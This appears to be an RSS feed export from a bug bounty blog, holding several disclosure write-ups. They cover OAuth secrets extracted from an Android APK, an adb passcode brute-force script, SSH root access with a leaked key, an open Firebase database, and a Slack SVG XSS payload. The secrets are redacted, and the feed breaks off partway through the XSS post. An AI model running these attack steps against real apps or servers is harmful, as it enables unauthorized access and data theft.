@@ -1,0 +1,1095 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>@omespino</title>
+	<atom:link href="/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>just another security blog.</description>
+	<lastBuildDate>Sat, 02 Apr 2022 03:19:31 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.9.3</generator>
+
+<image>
+	<url>/wp-content/uploads/2020/12/cropped-dddd-32x32.png</url>
+	<title>@omespino</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>WRITE UP – finAPI (Open Banking API) oauth credentials exposed in plain text in Android app </title>
+		<link>/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/</link>
+					<comments>/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Sat, 02 Apr 2022 03:15:45 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=2116</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a REDACTED bug bounty program and why you can always check the basic payloads because you will be surprised that sometimes will work. (Never save creds in plain text inside of android [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a REDACTED bug bounty program and why you can always check the basic payloads because you will be surprised that sometimes will work. (Never save creds in plain text inside of android application)<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p><br><strong>Report Summary:</strong><br><br>Hi REDACTED team, I was able to find the <strong>finAPI</strong> oauth credentials exposed in plain text in your REDACTED Android application.</p>
+
+
+
+<p><strong>Proof of concept:</strong><br><br>1.- Get the latest REDACTED Android application, in my case I downloaded it to my phone (connect the phone in debug mode) and then pull out the  APK with adb tools. (com.REDACTED.android.main is the&nbsp;APK package name):<br><br></p>
+
+
+
+<pre class="wp-block-code"><code>omespino@h0st:~# adb pull data/app/com.REDACTED.android.main/base.apk
+</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>2.- Then I decompile the APK with the following command apktool:<br></p>
+
+
+
+<pre class="wp-block-code"><code>omespino@h0st:~# apktool d base.apk
+</code></pre>
+
+
+
+<p>3.- Then I just grep for the &#8220;client_secret&#8221; to get finap url oauth</p>
+
+
+
+<pre class="wp-block-code"><code>omespino@h0st:~# grep -ihr --color client_secret ./base |&nbsp;head -1 
+
+&lt;string name="url_finapi_oauth"&gt;
+https://live.finapi.io/oauth/token?grant_type=client_credentials&amp;amp;client_id=00000000-0000-0000-0000-00000000&amp;amp;<span class="payload-highlight">client_secret</span>=00000000-0000-0000-0000-00000000
+&lt;/string&gt;
+</code></pre>
+
+
+
+<p>4.- At this point, anyone could start using finAPI on behalf of your company :</p>
+
+
+
+<pre class="wp-block-code"><code># first we need to get and access token from the fineapi
+# findAPI GET tokens documentation https://docs.finapi.io/#post-/oauth/token
+
+omespino@h0st:~# curl -sX POST "https://live.finapi.io/oauth/token?grant_type=client_credentials&amp;client_id=00000000-0000-0000-0000-00000000&amp;client_secret=00000000-0000-0000-0000-00000000" | json_pp
+
+{
+   "token_type" : "bearer",
+   "expires_in" : 1347,
+   <strong>"scope" : "all",</strong>
+   "access_token" : "IlR3byByb2FkcyBkaXZlcmdlZCBpbiBhIHdvb2QgYW5kIEkglyBJIHRvb2sgdGhlIG9uZSBsZXNzIHRyYXZlbGVkIGJ5LCBhbmQgdGhhdCBoYXMgbWFkZSBhbGwgdGhlIGRpZmZlcmVuY2Ui"
+}
+
+# then we can use the token to abuse the finAPI and get banks information
+#&nbsp;findAPI GET banks documentation https://docs.finapi.io/#get-/api/v1/banks
+
+omespino@h0st:~# curl -H 'Authorization: Bearer IlR3byBy...lcmVuY2Ui' https://live.finapi.io/api/v1/banks | json_pp
+
+{
+   "banks" : &#91;
+      {
+         "supportedDataSources" : &#91;
+            "XXXXX_SERVER"
+         ],
+         "location" : "XX",
+         "blz" : "903123123",
+         "lastSuccessfulCommunication" : "201X-0X-0X 13:37:00.000",
+         "loginFieldUserId" : "Onlinebanking-ID",
+         "isCustomerIdPassword" : false,
+         "isTestBank" : true,
+         "isSupported" : true,
+         "name" : "XXX-XXXXXXXsystem"
+      },
+      -------------- REDACTED -------------</code></pre>
+
+
+
+<p><br><strong>Environment and tools</strong><br><br>adb Android Debug Bridge <br>apktool </p>
+
+
+
+<p><strong>Impact</strong><br><br>Anyone, could create, get, update, delete, import users / banks / comunications in finAPI on REDACTED findAPI account.<br><br>Well, that’s it, share your thoughts, If you have any doubts, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.<a rel="noreferrer noopener" href="https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&amp;display=popup&amp;ref=plugin&amp;src=share_button" target="_blank"></a></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP –  Android Application Screen Lock bypass via adb brute forcing</title>
+		<link>/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/</link>
+					<comments>/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/#comments</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Tue, 22 Feb 2022 20:38:54 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=2062</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about how to simulate android keystrokes virtually in order to perform a brute-forcing attack with adb tools If you like Bug Bounty writeups please check my handbook Bug Bounty Write Ups Collection Report [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about how to simulate android keystrokes virtually in order to perform a brute-forcing attack with adb tools<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p><br><strong>Report Summary:</strong><br><br>Hi REDACTED team, I was able to find a way to bypass the screen lock in your REDACTED Android application.<br><br>I was able to bypass the passcode because there is no rate limit, so since it is a 4 digit passcode, anyone can try any combination between 0000 and 9999.</p>
+
+
+
+<p><strong>Proof of concept:</strong><br><br>1.- Get the latest REDACTED Android application (X.X.X version) from Google Playstore.<br><br>2.- Open the android application, login with your credentials, then navigate to:<br></p>
+
+
+
+<pre class="wp-block-code"><code>menu &gt; settings &gt; <span class="payload-highlight"><b>lockscreen </b></span> and set the passcode (in my case I set 5555 as passcode)</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>3.- Then connect your phone via USB, make sure that you have USB debugging mode in your phone, and test the connection with the following command</p>
+
+
+
+<pre class="wp-block-code"><code>omespino@h0st:~# adb devices
+List of devices attached
+e16bc6a3	device
+</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>3.- After that run the <span class="payload-highlight"><b>brute_passcode.sh</b></span> script (attached) and just wait</p>
+
+
+
+<pre class="wp-block-code"><code>#!/usr/bin/env bash
+package_name="com.example.redacted_application"
+adb shell am force-stop $package_name > /dev/null 2>&1
+adb shell monkey -p $package_name -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1
+clear
+echo
+echo "---- BRUTE FORCING SCRIPT STARTED ----"
+echo "launching REDACTED application ... DONE"
+# the user passcode is 5555, in this example just try 10 passcodes for the POC
+# for the full brute force just change {5550..5560} to {0000..9999}
+for i in {5550..5560}; do
+    printf "trying passcode %d \r" "$i"
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+done
+echo
+echo "bypass successfully"</code></pre>
+
+
+
+<p><br>PS. You can change the passcode range from {5550..5560} to {0000..9999}, I've tried with all combinations and it worked successfully because there is no limit rate-limited on passcode tries.<br><br>Number event codes list (<a href="https://stackoverflow.com/a/8483797">Stack overflow reference</a>):</p>
+
+
+
+<pre class="wp-block-code"><code>...
+7 --&gt;  "KEYCODE_0" 
+8 --&gt;  "KEYCODE_1" 
+9 --&gt;  "KEYCODE_2" 
+10 --&gt;  "KEYCODE_3" 
+11 --&gt;  "KEYCODE_4" 
+12 --&gt;  "KEYCODE_5" 
+13 --&gt;  "KEYCODE_6" 
+14 --&gt;  "KEYCODE_7" 
+15 --&gt;  "KEYCODE_8" 
+16 --&gt;  "KEYCODE_9" 
+...</code></pre>
+
+
+
+<div style="text-align: center !important;">
+<iframe loading="lazy" id="player" type="text/html" width="1024" height="390" src="https://www.youtube.com/embed/Ald7-MyFg3M" frameborder="0"></iframe>
+</div>
+
+
+
+<p><br><strong>Environment and tools</strong><br><br>adb Android Debug Bridge version 1.0.39<br>my own Android device<br></p>
+
+
+
+<p><strong>Impact</strong><br><br>An attacker can bypass REDACTED's android application lockscreen.<br><br>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.<a rel="noreferrer noopener" href="https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&amp;display=popup&amp;ref=plugin&amp;src=share_button" target="_blank"></a></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP –  PRIVATE BUG BOUNTY: RCE in ec2 instance via ssh with private key exposed on public GitHub repository – $XX,000 USD</title>
+		<link>/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/</link>
+					<comments>/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Thu, 03 Feb 2022 18:47:47 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=2018</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a private bug bounty program and why you can always check public repos on GitHub, because you will be surprised. If you like Bug Bounty writeups please check my handbook Bug Bounty [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a private bug bounty program and why you can always check public repos on GitHub, because you will be surprised.<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p><br><strong>Report Summary:</strong><br><br>Hi REDACTED COMPANY team, I have found a private key exposed and a config file for ssh in some GitHub public repo from a REDACTED COMPANY employee that lead me to perform an RCE on AWS ec2 instance.</p>
+
+
+
+<p><strong>Proof of concept:</strong><br><br>1.- On GitHub, after some dorks (<span class="payload-highlight"><b>/src/github.com/redacted_company IdentityFile</b></span> was the winner dork), I have found this public repository <a href="https://github.com/redacted_employee/configfiles/tree/23114...51312/ssh/">https://github.com/redacted_employee/configfiles/tree/23114&#8230;51312/ssh/</a> that contains 2 files, config and pkey.pem file: <br><br>config file:</p>
+
+
+
+<pre class="wp-block-code"><code>config: 
+Host devenv
+	HostName X.X.X.X
+	User ec2-user
+	Port 22
+	IdentityFile ~/configfiles/ssh/pkey.pem
+pkey.pem: (private key)</code></pre>
+
+
+
+<p>pkey.pem file:</p>
+
+
+
+<pre class="wp-block-code"><code>-----BEGIN RSA PRIVATE KEY-----
+  - - - R E D A C T E D - - -
+SSBkb24ndCBrbm93IGFueW1vcmUNCkFyZSB0aGUgbmVpZ2hib3JzIHdhdGNoaW5nIG1lPyAoV2hvJ3Mgd2F0Y2hpbmc/KQ0KV2VsbCwgaXMgdGhlIG1haWxtYW4gd2F0Y2hpbmcgbWU/IChUZWxsIG1lLCB3aG8ncyB3YXRjaGluZz8pDQpBbmQgSSBkb24ndCBmZWVsIHNhZmUgYW55bW9yZSwgb2gsIHdoYXQgYSBtZXNzDQpJIHdvbmRlciB3aG8ncyB3YXRjaGluZyBtZSBub3cgKHdobz8pLCB0aGUgSVJTPw==
+  - - - R E D A C T E D - - -
+-----END RSA PRIVATE KEY-----</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>2.- Then with any ssh client you just need to run:&nbsp;</p>
+
+
+
+<pre class="wp-block-code"><code># X.X.X.X was the IP of the Host that appears in the config file
+# you need to save the pkey.pem and change the key file permissions
+# with chmod 600 pkey.pem
+omespino@h0st:~# chmod 600 pkey.pem
+omespino@h0st:~# ssh -i pkey.pem ec2-user@X.X.X.X</code></pre>
+
+
+
+<p>3.- Once I got access I executed <span class="payload-highlight"><b>sudo su</b></span> and <span class="payload-highlight"><b>id</b></span> in order to confirm the admin privileges and we got <span class="payload-highlight"><b>root</b></span>:</p>
+
+
+
+<pre class="wp-block-code"><code>&#91;ec2-user@ip-172-X-X-X ~]$ sudo su
+root@ip-ip-172-X-X-X:/home/ec2-user# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+
+
+<p><br><strong>Environment and tools</strong>:<br><br>Any ssh client<br>My IP was X.X.X.X and I executed the<strong> sudo su</strong> and <strong>id</strong> commands to fingerprint the users and privileges and logged out <strong>immediately</strong> and I started to write this report, according to program terms no steps deeper were taken.</p>
+
+
+
+<p><strong>Impact</strong>:<br><br>The attacker can gain access to this ec2 instance and perform arbitrary commands as root.<br><br>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.<a rel="noreferrer noopener" href="https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&amp;display=popup&amp;ref=plugin&amp;src=share_button" target="_blank"></a></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP –  PRIVATE BUG BOUNTY: Firebase database exposed by misconfiguration – $2,000 USD</title>
+		<link>/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/</link>
+					<comments>/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Mon, 17 Jan 2022 17:18:17 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1959</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a private bug bounty program and why you can always check the basic payloads because you will be surprised that sometimes will work. If you like Bug Bounty writeups please check my [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a private bug bounty program and why you can always check the basic payloads because you will be surprised that sometimes will work.<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p><br><strong>Report Summary:</strong><br><br>Hi REDACTED team, I was able to find a firebase instance URL misconfigured exposed in your REDACTED Android application.</p>
+
+
+
+<p><strong>Proof of concept:</strong><br><br>1.- Get the latest REDACTED Android application, in my case I downloaded it to my phone (connect the phone in debug mode) and then pull out the  APK with adb tools. (com.REDACTED.android.main is the&nbsp;APK package name):<br><br></p>
+
+
+
+<pre class="wp-block-code"><code>omespino@h0st:~# adb pull data/app/com.REDACTED.android.main/base.apk
+</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>2.- Then I decompile the APK with the following command apktool:<br></p>
+
+
+
+<pre class="wp-block-code"><code>omespino@h0st:~# apktool d base.apk
+</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>3.- Then I just <meta charset="utf-8">grep for firebase and HTTP strings in the &#8220;base/AndroidManifest.xml&#8221; file.<br></p>
+
+
+
+<pre class="wp-block-code"><code><meta charset="utf-8"># grep for firebase and HTTP strings and got some URLs including the firebaseio.com one
+omespino@h0st:~# grep -ir firebase | grep http 
+- redacted - 
+ ...
+ ...
+ "https://API-REDACTED-XXXXXXXXXXXX.firebaseio.com/"
+ ...
+ ...
+- redacted -</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>4.- Simple POC to see the firebase misconfiguration (just append <strong>.json</strong> to the URL):<br></p>
+
+
+
+<pre class="wp-block-code"><code><meta charset="utf-8">omespino@h0st:~# curl -X GET -H "REDACTED-Security: @omespino" https://API-REDACTED-XXXXXXXXXXXX.firebaseio.com/.json
+</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>5.- See the full firebase database exposed because is misconfigured with bad permissions.<br><br>PD. I made the request and the stopped after testing that was vulnerable.</p>
+
+
+
+<p><br><strong>Environment and tools</strong><br><br>adb Android Debug Bridge version 1.0.39<br>apktool 2.3.3</p>
+
+
+
+<p><strong>Impact</strong><br><br>Since the full firebase database instance is misconfigured, anyone can pull the whole database.<br><br><br>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.<a rel="noreferrer noopener" href="https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&amp;display=popup&amp;ref=plugin&amp;src=share_button" target="_blank"></a></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>BOOK &#8211; Bug Bounty Write Ups collection  &#8211; Omar Espino</title>
+		<link>/bug-bounty-writeups-collection/</link>
+					<comments>/bug-bounty-writeups-collection/#comments</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Fri, 07 Jan 2022 22:56:40 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1825</guid>
+
+					<description><![CDATA[Bug Bounty Write ups Collection &#8211; omespino: More than $$$$$ USD in rewards by legally hacking big companies Description: With the passage of the years, I have been included in the hall of fame of companies such as Google (top 100 researcher worldwide), Microsoft, Facebook, Twitter, Slack, Netflix, Sony, Nokia, Telegram, etc. The main goal [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Bug Bounty Write ups Collection &#8211; omespino: More than $$$$$ USD in rewards by legally hacking big companies<br></p>
+
+
+
+<p></p>
+
+
+
+<div class="wp-block-image is-style-default"><figure class="aligncenter size-large is-resized"><a href="/wp-content/uploads/2022/01/BBE-digital-eng.jpg" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBE-digital-eng.jpg" alt="" class="wp-image-1845" width="332" height="512"/></a></figure></div>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p><br><br><strong>Description:</strong></p>
+
+
+
+<p>With the passage of the years, I have been included in the hall of fame of companies such as Google (top 100 researcher worldwide), Microsoft, Facebook, Twitter, Slack, Netflix, Sony, Nokia, Telegram, etc.<br><br>The main goal of sharing my experience as an information security fan is to motivate people and let them know that all are capable of hacking big companies and achieving big rewards, if I could, you can too.<br><br>In this handbook you will read vulnerabilities description and development, step by step, bugs that accumulated more than $$$$$ dollars in rewards legally.&nbsp;</p>
+
+
+
+<p></p>
+
+
+
+<p><br><br><strong>Table of contents:</strong></p>
+
+
+
+<p></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/wp-content/uploads/2022/01/table-of-contents.jpg"><img loading="lazy" src="/wp-content/uploads/2022/01/table-of-contents.jpg" alt="" class="wp-image-1828" width="512" height="388"/></a></figure></div>
+
+
+
+<p><br><br><strong>Details:</strong></p>
+
+
+
+<div class="wp-block-image is-style-default"><figure class="aligncenter size-large is-resized"><a href="/wp-content/uploads/2022/01/bbedetails.jpg"><img loading="lazy" src="/wp-content/uploads/2022/01/bbedetails-1024x188.jpg" alt="" class="wp-image-1858" width="512" height="94" srcset="/wp-content/uploads/2022/01/bbedetails-1024x188.jpg 1024w, /wp-content/uploads/2022/01/bbedetails-300x55.jpg 300w, /wp-content/uploads/2022/01/bbedetails-768x141.jpg 768w, /wp-content/uploads/2022/01/bbedetails-1250x230.jpg 1250w, /wp-content/uploads/2022/01/bbedetails-200x37.jpg 200w, /wp-content/uploads/2022/01/bbedetails.jpg 1274w" sizes="(max-width: 512px) 100vw, 512px" /></a></figure></div>
+
+
+
+<p><br><br><strong>Available at: </strong></p>
+
+
+
+<p><br><strong>9.99 USD amazon.com paperback, 3.99 USD eBook kindle </strong></p>
+
+
+
+<figure class="wp-block-image is-resized">
+ <a href="https://www.amazon.com/dp/B09PYZGJ11" taget="_blank">
+<img loading="lazy" src="/wp-content/uploads/2022/01/logo_amazon.png" alt="" width="256" height="65"></a></figure>
+
+
+
+<p><a href="https://www.amazon.com/dp/B09PYZGJ11" target="_blank" rel="noreferrer noopener">https://www.amazon.com/dp/B09PYZGJ11<br></a></p>
+
+
+
+<p><strong>2.99 USD PayPal digital format PDF<br></strong></p>
+
+
+
+<p>After finishing your purchase with PayPal you will receive the book in digital format in a period of fewer than 24 hours.<br><div ><form target='_blank' action='https://www.paypal.com/cgi-bin/webscr' method='post'><input type='hidden' name='cmd' value='_xclick' /><input type='hidden' name='business' value='CHR56JPAWJUUQ' /><input type='hidden' name='item_name' value='Bug' /><input type='hidden' name='currency_code' value='USD' /><input type='hidden' name='amount' value='2.99' /><input type='hidden' name='lc' value='EN_US'><input type='hidden' name='no_note' value=''><input type='hidden' name='paymentaction' value='sale'><input type='hidden' name='return' value='' /><input type='hidden' name='bn' value='WPPlugin_SP'><input type='hidden' name='cancel_return' value='' /><input style='border: none;' class='paypalbuttonimage' type='image' src='https://www.paypalobjects.com/webstatic/en_US/i/buttons/buy-logo-medium.png' border='0' name='submit' alt='Make your payments with PayPal. It is free, secure, effective.'><img alt='' border='0' style='border:none;display:none;' src='https://www.paypal.com/EN_US/i/scr/pixel.gif' width='1' height='1'></form></div></p>
+
+
+
+<p><br><strong>1.99 USD bitcoin BTC digital format PDF<br></strong><br>3M7pmdp6sbjBLGUfY3snUUj7ZoFtxeFekJ</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="/wp-content/uploads/2022/01/bitcoin.png"><img loading="lazy" src="/wp-content/uploads/2022/01/bitcoin.png" alt="" class="wp-image-1757" width="256" height="65"/></a></figure>
+
+
+
+<p><br><strong>1.99 USD ethereum ETH digital format PDF<br></strong><br>0x4a9e86451ae756d978f320d88ba3cef01ecebc2a</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="/wp-content/uploads/2022/01/eth_logo.jpg"><img loading="lazy" src="/wp-content/uploads/2022/01/eth_logo.jpg" alt="" class="wp-image-1757" width="256" height="65"/></a></figure>
+
+
+
+<p><br>After finishing your purchase with bitcoin, send an email to <meta charset="utf-8">om.espino+btc@gmail.com and you will receive the book in digital format in a period of fewer than 24 hours.<br><br>If you have any doubts or comments, please write a comment directly on this page, send an email to om.espino+support@gmail.com, or reach me on Twitter. (<a rel="noreferrer noopener" href="https://twitter.com/omespino" target="_blank">@omespino</a>)<br><br></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/bug-bounty-writeups-collection/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WRITE UP &#8211; XSS STORED IN FILES.SLACK.COM VIA XML/SVG FILE (IOS) &#8211;  $1,000 USD</title>
+		<link>/write-up-xss-stored-in-files-slack-com-via-xml-svg-file-ios-1000-usd/</link>
+					<comments>/write-up-xss-stored-in-files-slack-com-via-xml-svg-file-ios-1000-usd/#respond</comments>
+		
+		<dc:creator><![CDATA[omespino]]></dc:creator>
+		<pubDate>Fri, 03 Dec 2021 20:51:28 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1319</guid>
+
+					<description><![CDATA[Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about the Slack bug bounty program and why you can always check the basic payloads because you will surprise that some times will work This blogpost appeared first in the book Bug Bounty [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p><strong>Introduction:</strong></p>
+
+
+<p>Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about the Slack bug bounty program and why you can always check the basic payloads because you will surprise that some times will work<br><br></p>
+
+
+
+<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"/></a></figure></div>
+
+
+
+<p></p>
+
+
+
+<p><strong>Title: </strong>XSS stored in https://files.slack.com/ iOS app / iOS browsers via xml/svg file. <br><strong>Product / URL: ​</strong>Slack iOS app / iOS browsers <br> <br><strong>Report sent via Slack&#8217;s hackerone program (this is the actual report):</strong></p>
+
+
+
+<p>Hi ​Slack Security  team.</p>
+
+
+
+<p>I&#8217;ve found a XSS stored on file https://files.slack.com/ on iOS app / iOS browsers via xml/svg file.</p>
+
+
+
+<p><strong>POC:</strong></p>
+
+
+
+<p>1.- Login to the slack team space and upload a xml file with the following content to any slack channel (slack-xss.xml file attached):
+</p>
+
+<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;script&gt;prompt(document.location)&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+
+
+
+<p>2.- Look up for the xml file in the iOS app, see the snippet, click it to open the &#8220;raw view&#8221; and then open the option &#8220;View in Browser&#8221; and see the XSS.</p>
+
+
+
+<p>3.- Also in the &#8220;raw view&#8221; you can copy the link to quick access to that file. (Note, if you want send the link in slack channel you need paste the copied link and append a space+string, for example &#8220;https:// files[dot]slack[dot]com/files-pri/XXXXXXXXX-XXXXXXXXX/slack-xss.xml[SPACE]xss&#8221;.</p>
+
+
+
+<figure class="wp-block-image"><img src="/wp-content/uploads/2021/07/slack_xss_omespino.png" alt="" class="wp-image-430"/></figure>
+
+
+
+<p>Something important to highlight is: At this time you have a &#8220;magic&#8221; link that points directly to the special crafted XML document. ​</p>
+
+
+
